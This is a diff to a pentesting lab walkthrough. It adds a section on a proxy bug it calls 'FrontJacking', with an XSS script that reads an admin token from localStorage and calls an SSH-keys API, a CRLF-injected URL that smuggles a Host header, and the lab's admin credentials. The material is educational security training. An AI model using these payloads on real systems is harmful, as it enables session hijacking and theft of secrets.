@@ -63,7 +63,10 @@ Only going through the black-box is generally enough if you your work does not i
 
 ---
 
-**Important Note:** you will notice in the screenshots that I'm using port `8080` while your lab will use port `8090` and that's because I changed it for you as I know most of us already use `8080` for Burp.
+**Important Notes:** 
+- You will notice in the screenshots that I'm using port `8080` while your lab will use port `8090` and that's because I changed it for you as I know most of us already use `8080` for Burp
+- In this guide I'm using the HTTP version, so you will see me targeting for example `http://portal.skyblue.com:8090`, but everything we talk about below applied exactly when you run the HTTPs lab, just use `https` instead of `http`, i.e, `https://portal.skyblue.com:8090`
+- The only finding that is specific to the HTTPs lab is discussed at the end 
 
 ## Findings: portal.skyblue.com
 This is the main domain (set via the `default_server` directive in the nginx confi file), and it's what we as pentesters or bug bounty hunters don't usually spend much time navigating through, it's a boring status page!
@@ -965,6 +968,90 @@ location /docs/audit-report {
   proxy_pass http://flask-2:3000/docs/audit-report;
 }
 ```
+
+---
+
+### HTTPs Lab Specific Bug: Frontend Server Hijacking (FrontJacking)
+This bug class is novel and was observed in the wild after **React2Shell** was disclosed, and it's quite interesting, and can be seen in many variants, we will discuss one variant, however, all types of the issue come to one root cause; the use of the `$uri` or `$document_uri` directives in a frontend proxy.
+
+**Note:**
+In `https:portal.skyblue.com:8090`, 8080 is only the port exposed by docker, under the hood it's routing traffic to 443, so in a real life target it's `https://portal.skyblue.com:443` or just `https://portal.skyblue.com` as the port is inferred from the scheme.
+
+#### Black-Box Discovery
+When we visit one of the vhosts, like `https://portal.skyblue.com:8090`, in 99% of the time the reverse proxy performs SSL termination before routing our traffic to the backend, meaning it will receive the encrypted traffic, decrypt it and hand it to the corresponding vhost.
+
+The bug happens when the frontend server (the one performing the SSL termination) appends the URI sent by the client (in an unsafe way) when routing the decrypted request to the corresponding vhost.
+
+To exploit the bug, one of the following needs to be satisfied:
+- Attacker has a stored XSS or RCE on a subdomain that's possibly a neighbor to the target vhosts (from black-box we cannot tell, so we gotta test to see if the attack works)
+- Our target organization is a service that offers shared hosting
+
+1. For our lab, let's say our target is at `https://sandbox-dev-001.skyblue.com:8090`
+2. Fuzzing, we got and endpoint that seems to be authenticated `/api/ssh_keys` returning `401 UNAUTHORIZED`
+3. We assume that after admin logs in via `https://sandbox-dev-001.skyblue.com:8090/v1/login` (creds: `admin:sky321blue`) a token is saved in local storage, how to get it?
+4. FrontJacking can be our friend, let's say we already got stored XSS and injected it at the root of `https://compromised.skyblue.com:8090`, the below JS code basically fetched the local storage token and use it to send a request to the endpoint that was returning `401`
+```js
+    <script>
+        async function run() {
+            const tokenElement = document.getElementById("token");
+            const keysElement = document.getElementById("keys");
+
+            // Change this key if ssh_keys.html uses a different localStorage key.
+            const token = localStorage.getItem("admin_token");
+
+            if (!token) {
+                tokenElement.textContent = "No token found in localStorage.";
+                return;
+            }
+
+            tokenElement.textContent = token;
+
+            try {
+                const response = await fetch(
+                    "https://sandbox-dev-001.skyblue.com:8090/api/ssh_keys",
+                    {
+                        headers: {
+                            "Authorization": "Bearer " + token
+                        }
+                    }
+                );
+
+                const data = await response.json();
+
+                if (!response.ok) {
+                    keysElement.textContent =
+                        "Request failed: " + JSON.stringify(data, null, 2);
+                    return;
+                }
+
+                keysElement.textContent =
+                    JSON.stringify(data, null, 2);
+
+            } catch (error) {
+                keysElement.textContent =
+                    "Request error: " + error;
+            }
+        }
+
+        run();
+    </script>
+```
+5. Now let's finally exploit FrontJacking, all we gotta do is inject a CRLF and a host header pointing to the host where we injected the XSS
+```
+https:///%20HTTP/1.1%0d%0aHost:compromised.skyblue.com%0d%0a%0d%0a
+```
+So basically what the above request would do, is first send a request to the front end proxy which has one job; terminating SSL. Then after the traffic is clear, the frontend proxy tries to route it to the corresponding host `sandbox-dev-001`, however while doing so it treats the CRLF literally causing the request to be:
+```
+/ HTTP/1.1
+Host: compromised.skyblue.com
+
+ HTTP/1.1
+Host: sandbox-dev-001.skyblue.com
+---
+```
+Meaning the first request will go though, reaching out to the host with XSS, fetched it and executes it while the browser is still at `sandbox-dev-001.skyblue.com:8090`.
+
+<img width="2156" height="1068" alt="image" src="https://github.com/user-attachments/assets/e3ee03ae-6ea6-4556-8aea-0048aea203fc" />
 
 ---
 
